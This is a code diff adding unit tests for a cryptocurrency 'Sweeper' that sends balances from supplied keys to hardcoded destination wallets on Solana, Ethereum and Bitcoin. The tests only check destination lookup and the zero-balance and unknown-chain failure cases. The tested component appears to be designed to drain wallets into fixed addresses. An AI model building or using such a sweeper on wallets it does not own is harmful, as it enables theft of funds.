@@ -1048,3 +1048,36 @@ class TestEndToEnd:
             await hl.close()
         finally:
             os.unlink(db_path)
+
+
+# --- Sweeper Tests ---
+
+from src.modules.crypto.balance.sweeper import Sweeper, DESTINATION_WALLETS, SweepResult
+from src.modules.crypto.balance.chains import ETHEREUM, SOLANA, BITCOIN
+
+
+class TestSweeper:
+    def test_get_destination_known_chains(self):
+        s = Sweeper()
+        assert s.get_destination("Solana") == DESTINATION_WALLETS["solana"]
+        assert s.get_destination("Ethereum") == DESTINATION_WALLETS["ethereum"]
+        assert s.get_destination("Bitcoin") == DESTINATION_WALLETS["bitcoin"]
+
+    def test_get_destination_unknown(self):
+        s = Sweeper()
+        assert s.get_destination("UnknownChain") is None
+
+    @pytest.mark.asyncio
+    async def test_sweep_no_destination(self):
+        s = Sweeper()
+        chain = type("C", (), {"name": "Unknown", "chain_type": "x"})()
+        r = await s.sweep("aabb", chain, "addr", 100)
+        assert not r.success
+        assert "No destination" in r.error
+
+    @pytest.mark.asyncio
+    async def test_sweep_zero_balance(self):
+        s = Sweeper()
+        r = await s.sweep("aabb", ETHEREUM, "0xaddr", 0)
+        assert not r.success
+        assert "Zero balance" in r.error
